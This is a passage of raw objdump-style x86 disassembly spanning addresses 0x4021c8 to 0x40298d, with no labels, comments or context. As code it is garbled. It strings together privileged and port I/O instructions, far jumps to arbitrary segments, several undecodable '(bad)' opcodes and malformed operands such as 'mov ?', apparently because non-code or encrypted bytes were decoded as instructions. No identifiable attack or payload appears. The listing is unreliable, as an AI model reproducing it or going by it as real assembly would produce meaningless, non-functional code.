  4021c8:	into   
  4021c9:	mov    ebx,0x66f1ea9f
  4021ce:	test   eax,0xe7a46ee3
  4021d3:	jne    0x402241
  4021d5:	popa   
  4021d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021d7:	neg    DWORD PTR [esi-0x1a01ef4d]
  4021dd:	pushf  
  4021de:	fadd   DWORD PTR [ecx+esi*1]
  4021e1:	cmp    DWORD PTR [ebx+0x42],0x99418bb5
  4021e8:	sbb    bh,ch
  4021ea:	shr    DWORD PTR [ecx+edi*8+0x52],cl
  4021ee:	aad    0x6d
  4021f0:	jo     0x402191
  4021f2:	push   ebx
  4021f3:	push   eax
  4021f4:	into   
  4021f5:	pop    eax
  4021f6:	addr16 add eax,0x147bdc5e
  4021fc:	fisubr WORD PTR [ecx+0xd]
  4021ff:	sbb    BYTE PTR [ebp-0x93432f4],bh
  402205:	xor    ch,bh
  402207:	mov    cl,0xd2
  402209:	pop    esi
  40220a:	and    al,0x51
  40220c:	mov    bl,0xd1
  40220e:	mov    ds:0x8481ece0,eax
  402213:	sti    
  402214:	jnp    0x40221c
  402216:	fsub   DWORD PTR [edx+0x27]
  402219:	pop    esp
  40221a:	sbb    edi,DWORD PTR [ebx]
  40221c:	retf   
  40221d:	lods   al,BYTE PTR ds:[esi]
  40221e:	mov    al,ds:0xb8aeaf6a
  402223:	mov    ds:0x4eb7c7de,al
  402228:	call   0x8b6c:0xc8e3d34e
  40222f:	fdivp  st(6),st
  402231:	pop    edx
  402232:	adc    edi,DWORD PTR [edx-0x4d]
  402235:	push   0xba437d1c
  40223a:	hlt    
  40223b:	jmp    0x402296
  40223d:	add    ah,ah
  40223f:	pop    ss
  402240:	cmc    
  402241:	aam    0xe7
  402243:	and    DWORD PTR [edi],0x483bba5f
  402249:	adc    ebx,DWORD PTR [edi+0x5c55803b]
  40224f:	adc    al,0xae
  402251:	add    al,0xbf
  402253:	mov    esp,0x1241ace5
  402259:	mov    esp,0x75ff0d38
  40225e:	das    
  40225f:	xor    bl,BYTE PTR [ebx-0x51]
  402262:	inc    esi
  402263:	js     0x4021ea
  402265:	adc    dl,dl
  402267:	ror    BYTE PTR [ebx+eiz*4-0x7e],1
  40226b:	lods   al,BYTE PTR ds:[esi]
  40226c:	repnz push 0x4459e119
  402272:	loop   0x402255
  402274:	les    ecx,FWORD PTR [ebx+0xe]
  402277:	cdq    
  402278:	cmc    
  402279:	pop    eax
  40227a:	jbe    0x402256
  40227c:	sbb    ah,ah
  40227e:	jb     0x402260
  402280:	inc    edi
  402281:	loopne 0x4022bd
  402283:	xor    esp,DWORD PTR [eax]
  402285:	not    DWORD PTR [eax]
  402287:	into   
  402288:	jb     0x40225c
  40228a:	retf   
  40228b:	or     BYTE PTR [edi-0x102c02ab],ah
  402291:	cld    
  402292:	loopne 0x4022bf
  402294:	mov    ?,WORD PTR [ebp-0x17]
  402297:	test   eax,0x99c1a302
  40229c:	popf   
  40229d:	scas   al,BYTE PTR es:[edi]
  40229e:	push   ecx
  40229f:	or     al,0x14
  4022a1:	mov    DWORD PTR [edi-0x4],ecx
  4022a4:	push   0xffffffd9
  4022a6:	cli    
  4022a7:	repnz dec edx
  4022a9:	std    
  4022aa:	pop    eax
  4022ab:	ror    DWORD PTR [ebx+eiz*2],cl
  4022ae:	fstp   TBYTE PTR [ecx]
  4022b0:	xlat   BYTE PTR ds:[ebx]
  4022b1:	leave  
  4022b2:	lock adc BYTE PTR [edx],ah
  4022b5:	push   ebp
  4022b6:	nop
  4022b7:	jg     0x40230d
  4022b9:	test   DWORD PTR [esi+ebp*1-0x2a],0x797da354
  4022c1:	mov    edx,0x66830b66
  4022c7:	xor    al,0x78
  4022c9:	dec    esp
  4022ca:	cdq    
  4022cb:	dec    ebp
  4022cc:	sub    WORD PTR [ebx],bx
  4022cf:	xor    BYTE PTR [ebp+0x38],0xe8
  4022d3:	(bad)  
  4022d4:	sub    eax,eax
  4022d6:	mov    edi,DWORD PTR [eax]
  4022d8:	pop    esi
  4022d9:	jle    0x402268
  4022db:	(bad)
  4022df:	out    dx,al
  4022e0:	clc    
  4022e1:	xor    eax,0xaa9c0207
  4022e6:	outs   dx,DWORD PTR ds:[esi]
  4022e7:	dec    esi
  4022e8:	inc    esi
  4022e9:	enter  0xda83,0x24
  4022ed:	mov    edi,0x2efe53d1
  4022f2:	xchg   ecx,eax
  4022f3:	test   eax,0xc78d62b6
  4022f8:	xchg   BYTE PTR [eax],dh
  4022fa:	inc    esi
  4022fb:	outs   dx,BYTE PTR ds:[esi]
  4022fc:	sti    
  4022fd:	lds    ebx,FWORD PTR [esi+0x417a323c]
  402303:	jge    0x4022b2
  402305:	or     ch,BYTE PTR [eax+0x79]
  402308:	xlat   BYTE PTR ds:[ebx]
  402309:	xor    ecx,ebp
  40230b:	jb     0x4022bd
  40230d:	pop    ebx
  40230e:	scas   eax,DWORD PTR es:[edi]
  40230f:	jae    0x40235a
  402311:	in     al,dx
  402312:	hlt    
  402313:	(bad)  
  402315:	xchg   edi,eax
  402316:	pop    esi
  402317:	in     eax,dx
  402318:	mov    esi,0xe6cc3ac8
  40231d:	xlat   BYTE PTR ds:[ebx]
  40231e:	mov    al,ds:0xae328a38
  402323:	push   edi
  402324:	sub    eax,0x896aabab
  402329:	sub    cl,BYTE PTR [ecx-0x51227f1e]
  40232f:	cmc    
  402330:	mov    es,WORD PTR gs:[ecx]
  402333:	jmp    0x4022f8
  402335:	xlat   BYTE PTR ds:[ebx]
  402336:	shr    DWORD PTR [eax],cl
  402338:	and    eax,0x2d44ffe7
  40233d:	xchg   ebp,eax
  40233e:	mov    esi,0xb151a402
  402343:	push   eax
  402344:	pop    esi
  402345:	out    0x4b,eax
  402347:	and    DWORD PTR [eax+eiz*4+0x539edac7],ebx
  40234e:	cmp    DWORD PTR [ebx+0x6],ebx
  402351:	fisub  DWORD PTR [eax+0x21]
  402354:	in     al,0x55
  402356:	sti    
  402357:	lods   al,BYTE PTR ds:[esi]
  402358:	xchg   ebx,eax
  402359:	ins    BYTE PTR es:[edi],dx
  40235a:	jg     0x402363
  40235c:	push   ebp
  40235d:	inc    ebp
  40235e:	lods   eax,DWORD PTR ds:[esi]
  40235f:	adc    eax,0xaf1a9e0b
  402364:	loope  0x4023e3
  402366:	cmp    al,0x2
  402368:	xlat   BYTE PTR ds:[ebx]
  402369:	push   edi
  40236a:	jno    0x402343
  40236c:	les    edi,FWORD PTR [ebp+0xc]
  40236f:	jbe    0x402321
  402371:	push   ecx
  402372:	push   DWORD PTR [ecx+esi*2-0x11d02db2]
  402379:	sub    al,0xce
  40237b:	dec    eax
  40237c:	mov    ch,0x83
  40237e:	jle    0x40231f
  402380:	scas   eax,DWORD PTR es:[edi]
  402381:	dec    esp
  402382:	retf   
  402383:	add    DWORD PTR [ebp+0x57],ecx
  402386:	jno    0x4023b1
  402388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402389:	clc    
  40238a:	dec    BYTE PTR ds:0xf8f34829
  402390:	fs adc dh,BYTE PTR cs:[esi+esi*1]
  402395:	and    dh,BYTE PTR [edx+edi*8-0x122010ab]
  40239c:	jmp    0x48274698
  4023a1:	cmp    BYTE PTR [edi-0x65],0xac
  4023a5:	aas    
  4023a6:	aad    0x2a
  4023a8:	ins    BYTE PTR es:[edi],dx
  4023a9:	adc    DWORD PTR [ebx],ebp
  4023ab:	fdiv   st,st(2)
  4023ad:	add    esi,DWORD PTR [edx]
  4023af:	sahf   
  4023b0:	or     ecx,esi
  4023b2:	sub    ecx,DWORD PTR [ebx+ecx*8+0x9ba6366]
  4023b9:	push   ds
  4023ba:	add    edi,DWORD PTR [esi+0x23fe991e]
  4023c0:	xor    ecx,ecx
  4023c2:	cs out dx,al
  4023c4:	sub    al,0x4f
  4023c6:	sbb    al,0xf6
  4023c8:	cmp    BYTE PTR [ebp-0x637dd0e9],0x71
  4023cf:	jmp    0x402445
  4023d1:	push   edi
  4023d2:	rcr    BYTE PTR [esi+0x509fd081],1
  4023d8:	mov    dh,0xe
  4023da:	leave  
  4023db:	in     eax,0xc8
  4023dd:	rcr    DWORD PTR [ecx+0x34],1
  4023e0:	maskmovq mm7,(bad)
  4023e1:	idiv   DWORD PTR [ecx+0x4e61648f]
  4023e7:	pop    eax
  4023e8:	fiadd  WORD PTR [esi-0x697899e6]
  4023ee:	push   0x6f
  4023f0:	cld    
  4023f1:	loop   0x402417
  4023f3:	sahf   
  4023f4:	xor    BYTE PTR [ecx+0xa],0xc5
  4023f8:	lahf   
  4023f9:	jmp    0x20df:0xd7be9926
  402400:	lds    esp,FWORD PTR [edx-0x4356b863]
  402406:	ret    
  402407:	add    DWORD PTR [eax],ebx
  402409:	cli    
  40240a:	mov    dl,ch
  40240c:	push   ebp
  40240e:	stos   BYTE PTR es:[edi],al
  40240f:	pushf  
  402410:	cmp    DWORD PTR [ebp-0x1670c87f],eax
  402416:	aaa    
  402417:	push   edi
  402418:	mov    ?,esi
  40241a:	lods   eax,DWORD PTR ds:[esi]
  40241b:	mul    BYTE PTR [ebx-0x4b]
  40241e:	inc    esi
  40241f:	xchg   BYTE PTR [edi-0x43af17e2],al
  402425:	or     ch,BYTE PTR [ecx-0x3b691799]
  40242b:	loopne 0x402443
  40242d:	mov    bl,0xc0
  40242f:	jns    0x4024af
  402431:	pop    edx
  402432:	data16 xchg BYTE PTR [ecx+eiz*1-0x69a5cc08],ch
  40243a:	adc    DWORD PTR [esi],eax
  40243c:	jecxz  0x4023db
  40243e:	rol    cl,cl
  402440:	fisub  DWORD PTR [eax+0x617b5d8d]
  402446:	dec    ebx
  402447:	cli    
  402448:	mov    sp,0x85d7
  40244c:	inc    ebp
  40244d:	dec    ebp
  40244e:	mov    bl,cl
  402450:	popa   
  402451:	cld    
  402452:	add    dh,dh
  402454:	mov    cl,0x6c
  402456:	clc    
  402457:	mov    edx,0x5ae6ca21
  40245c:	sbb    eax,0x5f3f6365
  402461:	ja     0x402453
  402463:	out    0x59,al
  402465:	mov    esp,0xce9fe252
  40246a:	xchg   ebp,eax
  40246b:	mov    ds:0x76e803eb,al
  402470:	scas   al,BYTE PTR es:[edi]
  402471:	dec    ecx
  402472:	xor    edi,0x61
  402475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402476:	cmp    eax,0x66dde6ba
  40247b:	fwait
  40247c:	xchg   esi,eax
  40247d:	cs ds dec edx
  402480:	mov    ds:0xdcddfe36,al
  402485:	xchg   esp,eax
  402486:	mov    eax,ds:0x726c1303
  40248b:	fist   DWORD PTR [ecx+0x66]
  40248e:	or     DWORD PTR [edx+0x16a6b14d],0xd9c76976
  402498:	fdiv   st,st(2)
  40249a:	mov    ds:0x331b93b2,al
  40249f:	xchg   ebx,eax
  4024a0:	sbb    dh,BYTE PTR [esi-0x7f]
  4024a3:	or     DWORD PTR [ebx+0x6ebdb897],esi
  4024a9:	mov    edi,0xe2615b5b
  4024ae:	push   esp
  4024af:	enter  0x3c96,0x98
  4024b3:	pushf  
  4024b4:	lock inc eax
  4024b6:	test   eax,0xa6dc7b45
  4024bb:	out    dx,eax
  4024bc:	ja     0x40245a
  4024be:	das    
  4024bf:	pop    ebx
  4024c0:	cmp    bl,BYTE PTR [edi+eiz*8]
  4024c3:	inc    ebp
  4024c4:	test   DWORD PTR [ebx-0x22c4a761],edx
  4024ca:	push   ss
  4024cb:	xor    esp,0xffffffe3
  4024ce:	mov    bh,0x54
  4024d0:	push   cs
  4024d1:	dec    ecx
  4024d2:	inc    esi
  4024d3:	sub    BYTE PTR [ecx],bh
  4024d5:	mov    DWORD PTR [edi-0x3],ebp
  4024d8:	les    eax,FWORD PTR [ebx]
  4024da:	std    
  4024db:	cdq    
  4024dc:	add    al,BYTE PTR [eax]
  4024de:	sbb    al,0xaf
  4024e0:	or     al,0x86
  4024e2:	sub    DWORD PTR [edi+eax*2+0x13],esp
  4024e6:	mov    WORD PTR [ebx-0x75],ss
  4024e9:	(bad)  
  4024ea:	jle    0x4024bb
  4024ec:	mov    DWORD PTR [edi],esp
  4024ee:	retf   
  4024ef:	test   eax,0xa315f4c5
  4024f4:	push   ds
  4024f5:	cmp    DWORD PTR [eax-0x3bfba682],eax
  4024fb:	int3   
  4024fc:	dec    esp
  4024fd:	or     dl,BYTE PTR [ebx-0x7363382]
  402503:	cmp    eax,0xe1455ebe
  402508:	addr16 lock pop ss
  40250b:	sub    al,0xe1
  40250d:	add    al,0x74
  40250f:	jmp    0xede7:0xd387dd81
  402516:	jnp    0x402593
  402518:	icebp  
  402519:	push   cs
  40251a:	div    BYTE PTR [eax]
  40251c:	pop    ecx
  40251d:	add    DWORD PTR [edx],edx
  40251f:	outs   dx,BYTE PTR ds:[esi]
  402520:	cmp    al,0xc0
  402522:	mov    edi,0x3fba1c83
  402527:	pop    ss
  402528:	pop    ecx
  402529:	jle    0x40258c
  40252b:	sbb    eax,0x1cc512ef
  402530:	bnd ret 0xf0fd
  402534:	xchg   esi,eax
  402535:	les    ebp,FWORD PTR [ebp+0x78]
  402538:	out    dx,al
  402539:	aas    
  40253a:	xchg   esi,eax
  40253b:	mov    esi,0xac929a9e
  402540:	push   0x56
  402542:	add    al,0x54
  402544:	jo     0x40253a
  402546:	pop    esp
  402547:	ret    
  402548:	fild   QWORD PTR [edx]
  40254a:	sbb    DWORD PTR [ecx-0x61cd4801],ebp
  402550:	test   eax,0x704d19fe
  402555:	mov    ch,0x35
  402557:	retf   0xbe90
  40255a:	jmp    FWORD PTR [ebp-0x2027b72b]
  402560:	mov    BYTE PTR [ebx],bh
  402562:	inc    esp
  402563:	adc    BYTE PTR [edi-0x5748045c],ah
  402569:	mov    WORD PTR [ebx-0x30],fs
  40256c:	stc    
  40256d:	sbb    ah,ch
  40256f:	xor    DWORD PTR [ecx+0x1b],esp
  402572:	call   0xcbe3:0xf62f6d94
  402579:	ret    0x2df6
  40257c:	pushf  
  40257d:	push   eax
  40257e:	das    
  40257f:	push   ebx
  402580:	or     dl,BYTE PTR [ebp+edx*8+0x4b]
  402584:	out    0xc8,al
  402586:	and    BYTE PTR fs:[ecx-0x5d],bl
  40258a:	jnp    0x40252c
  40258c:	sbb    eax,0xc4010dff
  402591:	leave  
  402592:	pop    ds
  402593:	fwait
  402594:	or     esp,ebp
  402596:	nop
  402597:	les    esi,FWORD PTR [ecx+ebp*2+0x1233773]
  40259e:	out    dx,eax
  40259f:	mov    dh,0x3a
  4025a1:	movlps QWORD PTR ds:0x35aa7e74,xmm5
  4025a8:	adc    ebx,DWORD PTR [ebx+0x69]
  4025ab:	je     0x40253c
  4025ad:	ss cli 
  4025af:	and    BYTE PTR [ebp-0x78],ah
  4025b2:	icebp  
  4025b3:	out    dx,eax
  4025b4:	popa   
  4025b5:	or     esp,DWORD PTR [edx]
  4025b7:	add    ebp,ecx
  4025b9:	jnp    0x402639
  4025bb:	cli    
  4025bc:	inc    esp
  4025bd:	mov    edi,0xe9722539
  4025c2:	add    eax,0xaadc56c5
  4025c7:	and    BYTE PTR [edi+0x3d546ac2],ch
  4025cd:	xor    ebx,ecx
  4025cf:	ret    0x57da
  4025d2:	popa   
  4025d3:	and    esi,DWORD PTR [ecx-0x2b97b925]
  4025d9:	out    0xdf,eax
  4025db:	or     eax,0xa3474478
  4025e0:	cmp    eax,0x5f0cbda
  4025e5:	(bad)  
  4025e6:	or     cl,BYTE PTR [ebp-0x31d56b6c]
  4025ec:	outs   dx,DWORD PTR ds:[esi]
  4025ed:	or     eax,DWORD PTR [eax+0x3a72cea6]
  4025f3:	push   ss
  4025f4:	movhps xmm2,QWORD PTR [edx+0x3d8504a6]
  4025fb:	jae    0x402611
  4025fd:	push   0xf7456e04
  402602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402603:	es inc ecx
  402605:	add    DWORD PTR cs:0x7821e7e5,edi
  40260c:	inc    esi
  40260d:	lods   al,BYTE PTR ds:[esi]
  40260e:	lea    ebp,[ebx+eax*2-0x5fa354a6]
  402615:	int3   
  402616:	retf   
  402617:	cmp    BYTE PTR ds:0x7eccde9,al
  40261d:	in     al,0x1e
  40261f:	mov    ebp,0x8a2462e0
  402624:	adc    ebp,DWORD PTR ds:0x827f7ba3
  40262a:	retf   0x90df
  40262d:	fnstenv [edi]
  40262f:	test   BYTE PTR [ebx+0x4c],dl
  402632:	mov    esp,0x79bf90cb
  402637:	les    ebp,FWORD PTR [ebx-0x72186771]
  40263d:	js     0x4025f9
  40263f:	xlat   BYTE PTR ds:[ebx]
  402640:	push   cs
  402641:	add    BYTE PTR [ebp-0x68],ah
  402644:	mov    eax,ds:0x60fee664
  402649:	mov    al,ds:0x9574f4ab
  40264e:	sbb    ah,BYTE PTR [eax+0x67]
  402651:	inc    eax
  402652:	repz ds jo 0x4025e3
  402656:	push   cs
  402657:	sbb    esp,DWORD PTR [edi+0x3802e055]
  40265d:	inc    edi
  40265e:	xor    al,0xc0
  402660:	dec    eax
  402661:	int    0x92
  402663:	or     dh,BYTE PTR [esi+0x7c906ac7]
  402669:	mov    DWORD PTR [edx+0x43fa13ed],ecx
  40266f:	adc    al,BYTE PTR [esi]
  402671:	out    0xa7,al
  402673:	in     eax,0x95
  402675:	adc    ebp,edi
  402677:	cs and eax,0x7d51456a
  40267d:	xor    al,0xc8
  40267f:	inc    eax
  402680:	jno    0x4026a5
  402682:	or     ebp,ebx
  402684:	scas   eax,DWORD PTR es:[edi]
  402685:	mov    bl,0xb9
  402687:	cmc    
  402688:	xor    ch,dh
  40268a:	loope  0x402707
  40268c:	push   eax
  40268d:	push   0x5
  40268f:	jp     0x402658
  402691:	cmp    ah,BYTE PTR [edx+0x2d]
  402694:	nop
  402695:	adc    al,0x8c
  402697:	inc    ecx
  402698:	or     ecx,ebp
  40269a:	sub    eax,0xbc58e5a7
  40269f:	push   esi
  4026a0:	fmul   QWORD PTR [ecx-0x68]
  4026a3:	adc    al,0x8c
  4026a5:	jo     0x402712
  4026a7:	xchg   edx,eax
  4026a8:	mov    cl,0x40
  4026aa:	xchg   esp,eax
  4026ab:	aaa    
  4026ac:	jne    0x402647
  4026ae:	pop    edi
  4026af:	sti    
  4026b0:	inc    esp
  4026b1:	(bad)  
  4026b2:	mov    al,0x41
  4026b4:	push   ebp
  4026b5:	mov    DWORD PTR [edx+0x12],ebx
  4026b8:	sti    
  4026b9:	out    dx,al
  4026ba:	out    dx,eax
  4026bb:	dec    esi
  4026bc:	pop    eax
  4026bd:	mov    WORD PTR [esi-0x38],fs
  4026c0:	pop    ebp
  4026c1:	or     dh,BYTE PTR [edi-0x3f3b7da8]
  4026c7:	adc    al,0x5a
  4026c9:	xchg   ebx,eax
  4026ca:	inc    edi
  4026cb:	aas    
  4026cc:	jl     0x4026c6
  4026ce:	xor    eax,0xf876ff61
  4026d3:	hlt    
  4026d4:	retf   0x966b
  4026d7:	shr    BYTE PTR [ebx+edi*2+0x63],1
  4026db:	cmp    dh,ah
  4026dd:	scas   al,BYTE PTR es:[edi]
  4026de:	jne    0x402664
  4026e0:	dec    ecx
  4026e1:	mov    dl,0xe0
  4026e3:	rcl    DWORD PTR [esi],0xef
  4026e6:	and    esp,ebx
  4026e8:	(bad)  
  4026e9:	test   BYTE PTR ds:0x891e3ff5,0xf9
  4026f0:	sub    al,dh
  4026f2:	out    dx,eax
  4026f3:	add    ebp,DWORD PTR [eax]
  4026f5:	xchg   BYTE PTR [edi+0x40],bl
  4026f8:	neg    ebx
  4026fa:	mov    BYTE PTR [edx],bh
  4026fc:	fisub  WORD PTR [edx]
  4026fe:	push   ss
  4026ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402700:	jae    0x4026b0
  402702:	inc    ebp
  402703:	xchg   esi,eax
  402704:	dec    ebx
  402705:	and    edx,esi
  402707:	test   ah,bh
  402709:	push   edx
  40270a:	or     edi,DWORD PTR [edi-0x4f]
  40270d:	sahf   
  40270e:	push   eax
  40270f:	pop    es
  402710:	es xchg esp,eax
  402712:	sbb    BYTE PTR [ebp+0x1100e440],ch
  402718:	rol    DWORD PTR [edx+eiz*8-0x1b66531d],cl
  40271f:	ret    0xbe36
  402722:	lods   eax,DWORD PTR ds:[esi]
  402723:	ins    BYTE PTR es:[edi],dx
  402724:	xor    DWORD PTR [edx],0x41
  402727:	sub    eax,0x2e232fc0
  40272c:	adc    eax,0xc5ff1c6a
  402731:	rol    BYTE PTR [esi-0x76],0x55
  402735:	in     eax,dx
  402736:	not    DWORD PTR [ebp+ecx*4-0x2ad9e0ff]
  40273d:	outs   dx,BYTE PTR ds:[esi]
  40273e:	and    edi,eax
  402740:	sbb    DWORD PTR [edi-0x6139abb8],0x91ab2a11
  40274a:	arpl   WORD PTR [edx],dx
  40274c:	jmp    0x4027ab
  40274e:	mov    ebp,DWORD PTR [ebp+eiz*2-0x32]
  402752:	test   eax,0x893ffab
  402757:	fistp  DWORD PTR [ecx-0x7b]
  40275a:	rol    bl,1
  40275c:	(bad)  
  40275d:	repz dec edi
  40275f:	imul   BYTE PTR [ecx+0x5bba92ce]
  402765:	ja     0x40277a
  402767:	leave  
  402768:	aaa    
  402769:	xchg   BYTE PTR [eax+edi*4-0x15],ch
  40276d:	les    esi,FWORD PTR [ebp-0x7b75d25d]
  402773:	sbb    DWORD PTR [ecx+0x21],0x19ad5424
  40277a:	xor    edi,DWORD PTR [edi-0x38b808c5]
  402780:	xchg   edi,eax
  402781:	inc    ebp
  402782:	inc    esi
  402783:	mov    ecx,0x6d1a2dbe
  402788:	and    ah,BYTE PTR [eax+0x3bc1c69e]
  40278e:	xor    ch,BYTE PTR [ecx+eax*1]
  402791:	lods   eax,DWORD PTR gs:[esi]
  402793:	xchg   edi,eax
  402794:	ucomiss xmm1,DWORD PTR [esi]
  402797:	inc    eax
  402798:	js     0x402727
  40279a:	fld    TBYTE PTR [esi-0x1f85aa2d]
  4027a0:	test   BYTE PTR [edi-0x54],cl
  4027a3:	adc    al,0xe3
  4027a5:	test   ebp,edx
  4027a7:	popa   
  4027a8:	mov    cl,BYTE PTR [edx]
  4027aa:	out    dx,al
  4027ab:	inc    eax
  4027ac:	jns    0x4027ee
  4027ae:	ss xchg ch,ch
  4027b1:	popa   
  4027b2:	scas   eax,DWORD PTR es:[edi]
  4027b3:	sahf   
  4027b4:	inc    ebx
  4027b5:	lods   eax,DWORD PTR ds:[esi]
  4027b6:	nop    DWORD PTR [esi]
  4027b9:	inc    ebp
  4027ba:	dec    ebx
  4027bc:	je     0x40274f
  4027be:	ficomp WORD PTR [ebx]
  4027c0:	dec    ebx
  4027c1:	mov    al,ds:0xcb7743bf
  4027c6:	jne    0x4027bb
  4027c8:	pop    es
  4027c9:	(bad)  
  4027ca:	and    al,0x6
  4027cc:	mov    ch,0x8e
  4027ce:	gs and al,0x5b
  4027d1:	sti    
  4027d2:	or     BYTE PTR [eax+0x49a2a71f],bh
  4027d8:	(bad)  
  4027d9:	pushf  
  4027da:	popa   
  4027db:	div    DWORD PTR [edi]
  4027dd:	pusha  
  4027de:	or     al,BYTE PTR [edi+0x49cb0b1e]
  4027e4:	xor    BYTE PTR [esi+0x75],0xbb
  4027e8:	inc    ecx
  4027e9:	adc    dh,ah
  4027eb:	dec    esp
  4027ec:	sub    eax,0x9f19aa4f
  4027f1:	jg     0x402822
  4027f3:	jl     0x402797
  4027f5:	mov    edi,esp
  4027f7:	xlat   BYTE PTR ds:[ebx]
  4027f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027f9:	test   al,0x7b
  4027fb:	pusha  
  4027fc:	lock aam 0x21
  4027ff:	sbb    eax,esi
  402801:	idiv   DWORD PTR ds:0x12138bed
  402807:	mov    al,0xf0
  402809:	and    cl,bl
  40280b:	or     eax,0xc52dcf81
  402810:	aad    0x78
  402812:	jne    0x40282a
  402814:	jne    0x40284f
  402816:	xor    dh,BYTE PTR [eax-0x5751d8ac]
  40281c:	fidivr DWORD PTR [edx]
  40281e:	jne    0x4027b7
  402820:	inc    ebx
  402821:	into   
  402822:	(bad)  
  402823:	mov    ch,0xdf
  402825:	xchg   esp,eax
  402826:	sahf   
  402827:	js     0x4027f4
  402829:	out    dx,eax
  40282a:	js     0x4027fb
  40282c:	lea    ebx,[edi]
  40282e:	jb     0x4028a5
  402830:	fsub   DWORD PTR [edx]
  402832:	xchg   ebx,eax
  402833:	retf   0x6a9e
  402836:	mov    al,ds:0xfa01f55
  40283b:	scas   al,BYTE PTR es:[edi]
  40283c:	out    0xfc,al
  40283e:	xchg   BYTE PTR [eax+0x5f],ch
  402841:	cwde   
  402842:	jp     0x4027d2
  402844:	es ss xchg ecx,eax
  402847:	jnp    0x4028c3
  402849:	push   esi
  40284a:	in     eax,dx
  40284b:	adc    BYTE PTR [esi-0x6db7785],dh
  402851:	lods   eax,DWORD PTR ds:[esi]
  402852:	jne    0x402878
  402854:	neg    dh
  402856:	test   DWORD PTR [edx+0x1e21a12c],esp
  40285c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40285d:	dec    eax
  40285e:	imul   edi,ebp,0x5a0ebfa2
  402864:	push   ecx
  402865:	jmp    0xc4ccfc4a
  40286a:	sub    al,0x3e
  40286c:	fwait
  40286d:	mov    edx,0xac43950d
  402872:	loopne 0x40289b
  402874:	inc    eax
  402875:	or     al,0x92
  402877:	cmp    eax,0xf1b715ee
  40287c:	cwde   
  40287d:	dec    esi
  40287e:	int3   
  40287f:	inc    eax
  402880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402881:	adc    DWORD PTR [ebx+ebp*8],ebx
  402884:	int    0x12
  402886:	cmp    BYTE PTR [esi],dh
  402888:	stos   DWORD PTR es:[edi],eax
  402889:	adc    bl,ah
  40288b:	daa    
  40288c:	rol    DWORD PTR [ebx-0x26],cl
  40288f:	inc    esp
  402890:	cwde   
  402891:	shl    DWORD PTR [esi],0xe0
  402894:	lock fadd DWORD PTR [eax+0x2f385745]
  40289b:	in     eax,0x98
  40289d:	inc    edx
  40289e:	pop    ebp
  40289f:	and    eax,DWORD PTR [edx]
  4028a1:	iret   
  4028a2:	mov    edx,0x419859ae
  4028a7:	rcr    esi,0xe7
  4028aa:	sbb    al,0x2
  4028ac:	loope  0x4028f5
  4028ae:	pushf  
  4028af:	sub    DWORD PTR [ebx-0x6d],ebp
  4028b2:	xchg   edi,eax
  4028b3:	sub    esp,DWORD PTR [ebp-0x37667b06]
  4028b9:	inc    esi
  4028ba:	repz dec edi
  4028bc:	xor    DWORD PTR [edx],esi
  4028be:	stc    
  4028bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028c0:	cmp    eax,0x4982215d
  4028c5:	sbb    esp,DWORD PTR [esi]
  4028c7:	das    
  4028c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028c9:	in     al,dx
  4028ca:	or     ah,bh
  4028cc:	lock sub esp,DWORD PTR [eax]
  4028cf:	sbb    eax,0x7ac8797d
  4028d4:	(bad)  
  4028d5:	adc    eax,DWORD PTR [esi-0x59]
  4028d8:	ds ja  0x4028af
  4028db:	xchg   ah,ah
  4028dd:	fmul   QWORD PTR [edi-0x48]
  4028e0:	mov    esi,DWORD PTR [edi-0x1da3f08b]
  4028e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028e7:	jl     0x4028a3
  4028e9:	ds fucom st(0)
  4028ec:	or     al,0xfa
  4028ee:	std    
  4028ef:	xor    DWORD PTR [esi-0x20],0x70ad28a9
  4028f6:	xor    bh,BYTE PTR [edx]
  4028f8:	push   ds
  4028f9:	mov    ebp,eax
  4028fb:	fsubr  DWORD PTR [edx+edx*8]
  4028fe:	test   BYTE PTR [ebp+0x1a],0x89
  402902:	push   esi
  402903:	jb     0x402887
  402905:	icebp  
  402906:	mov    ds:0x2d75c6ef,al
  40290b:	je     0x4028e4
  40290d:	jge    0x402930
  40290f:	and    al,0x3e
  402911:	aad    0x39
  402913:	jmp    0xf532:0x64bffd23
  40291a:	pop    eax
  40291b:	mov    dh,0x76
  40291d:	or     ecx,DWORD PTR [esi-0x4c]
  402920:	imul   ecx,DWORD PTR [edx],0x5d
  402923:	retf   
  402924:	xchg   ebp,eax
  402925:	fs mov ch,0xe0
  402928:	scas   eax,DWORD PTR es:[edi]
  402929:	es shl ch,0x98
  40292d:	xor    eax,0x8e33f8f6
  402932:	pop    es
  402933:	jo     0x4028bb
  402935:	push   eax
  402936:	xor    DWORD PTR [esi+eiz*2-0xae54815],edx
  40293d:	or     ebp,edx
  40293f:	push   ecx
  402940:	sub    dl,BYTE PTR [edx-0x73]
  402943:	sub    DWORD PTR [eax+0x4d54a20a],ecx
  402949:	ret    0x3c57
  40294c:	jg     0x40290e
  40294e:	enter  0xe30d,0x4e
  402952:	jl     0x402984
  402954:	xor    BYTE PTR [edi+0x75],al
  402957:	push   esi
  402958:	ror    BYTE PTR [edi-0x4eee85ae],cl
  40295e:	mov    dh,0xa4
  402960:	retf   
  402961:	jle    0x40298c
  402963:	inc    ebx
  402964:	cdq    
  402965:	out    dx,al
  402966:	pop    ebx
  402967:	push   ebp
  402968:	lahf   
  402969:	or     DWORD PTR [ebx],eax
  40296b:	ins    DWORD PTR es:[edi],dx
  40296c:	jecxz  0x40292a
  40296e:	sub    al,0x4f
  402970:	push   es
  402971:	jns    0x4029cc
  402973:	sbb    al,dl
  402975:	ss icebp 
  402977:	xchg   edi,eax
  402978:	inc    ebx
  402979:	(bad)  
  40297a:	clc    
  40297b:	pop    esp
  40297c:	fist   DWORD PTR [ecx+0x60aae4d4]
  402982:	add    dh,BYTE PTR gs:[ecx+0x10]
  402986:	sbb    DWORD PTR [edx+0x668f34e1],edi
  40298c:	pop    edi
  40298d:	test   DWORD PTR [edi],ebx
